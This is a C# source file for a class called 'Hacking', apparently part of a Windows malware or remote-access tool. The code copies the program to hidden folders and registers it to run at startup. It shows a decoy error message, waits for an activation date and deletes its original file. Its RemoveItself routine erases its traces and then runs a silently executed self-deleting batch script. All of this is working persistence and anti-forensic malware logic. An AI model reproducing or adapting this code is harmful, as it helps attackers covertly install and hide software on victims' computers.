using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Main.Properties;

namespace Main.Tools
{
    internal static class Hacking
    {
        internal static void InitSoftware(Config.StartModeType startMode, string arg)
        {
            // If debug, show a welcome debug message.
            // Don't copy itself anywhere.
            // Don't start with windows.
            if (startMode == Config.StartModeType.Debug)
            {
                MessageBox.Show(Resources.StartModeDebug);
                return;
            }
            // Else don't show welcome debuge message.
            // Start with windows.
            // Copy itself to 2 hidden places.

            // Only the temporarly application can have argument.
            if (arg != null)
            {
                if (startMode == Config.StartModeType.DeleteItself)
                {
                    // arg should be the path if an other program started it
                    // format: " " replaced by "?"
                    arg = arg.Replace("?", " ");
                    if (Path.IsPathRooted(arg))
                    {
                        if (File.Exists(arg))
                        {
                            var i = 0;
                            bool isRunning;
                            do
                            {
                                var exeNameWithoutExtension = Path.GetFileNameWithoutExtension(arg);
                                var exeFolderPath = Directory.GetParent(arg).ToString();
                                isRunning =
                                    Process.GetProcessesByName(exeNameWithoutExtension)
                                        .FirstOrDefault(
                                            p =>
                                                p.MainModule.FileName.StartsWith(exeFolderPath)) !=
                                    default(Process);

                                Thread.Sleep(100);
                                i++;
                            } while (isRunning && i < 100);
                            Thread.Sleep(300);
                            if (!isRunning) File.Delete(arg);
                        }
                    }
                }
                if (startMode == Config.StartModeType.ErrorMessage)
                {
                    MessageBox.Show(Config.ErrorMessage, Config.ErrorTitle, MessageBoxButtons.OK, MessageBoxIcon.Error);
                }

                if (Config.OnlyRunAfterSysRestart)
                    Environment.Exit(0);
                return;
            }

            var tempExePath = Config.TempExePath;

            // If startup method is startup folder copy to the startup folder and to an other hidden folder
            if (Config.FinalExeRelativePath != null)
            {
                var startupExePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup),
                       Path.GetFileName(Config.FinalExeRelativePath));

                Windows.SetStartup(Config.StartupMethod);

                if (Application.ExecutablePath == Config.FinalExePath)
                    return;
                if (Application.ExecutablePath == startupExePath)
                    return;
            }

            if (ExeSmartCopy(Config.FinalExePath, true))
            {
                ExeSmartCopy(tempExePath, true);
            }

            var formattedExePath = Application.ExecutablePath.Replace(" ", "?");
            Process.Start(tempExePath, formattedExePath);
            Environment.Exit(0);
        }

        internal static bool ExeSmartCopy(string targetExePath, bool overwrite)
        {
            if (Application.ExecutablePath == targetExePath) return false;

            var targetExeFolder = Directory.GetParent(targetExePath);
            Directory.CreateDirectory(targetExeFolder.ToString());

            File.Copy(Application.ExecutablePath, targetExePath, overwrite); 
            return true;
        }

        internal static bool ShouldActivate()
        {
            return DateTime.Now > Config.ActiveAfterDateTime;
        }

        internal static void RemoveItself()
        {
            if (Config.StartMode == Config.StartModeType.Debug)
                Environment.Exit(0);
            try
            {
                Windows.RemoveStartupRegistry(Config.FinalExePath);

                var deleteDirPaths = new HashSet<string>
                {
                    Path.GetDirectoryName(Config.FinalExePath),
                    Path.GetDirectoryName(Config.TempExePath),
                    Config.WorkFolderPath
                };
                foreach (var path in deleteDirPaths)
                {
                    try
                    {
                        if (Directory.Exists(path))
                        {
                            Directory.Delete(path, true);
                        }
                    }
                    catch (Exception)
                    {
                        // Ignore
                    }
                }

                var vBatFile = Path.GetDirectoryName(Application.ExecutablePath) + "\\DeleteItself.bat";
                using (var vStreamWriter = new StreamWriter(vBatFile, false, Encoding.Default))
                {
                    vStreamWriter.Write(":del\r\n" +
                                        " del \"{0}\"\r\n" +
                                        "if exist \"{0}\" goto del\r\n" +
                                        "del %0\r\n", Application.ExecutablePath);
                }

                //************ Batch execution
                WinExec(vBatFile, 0);
            }
            finally
            {
                Environment.Exit(0);
            }
        }
        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        public static extern uint WinExec(string lpCmdLine, uint uCmdShow);
    }
}
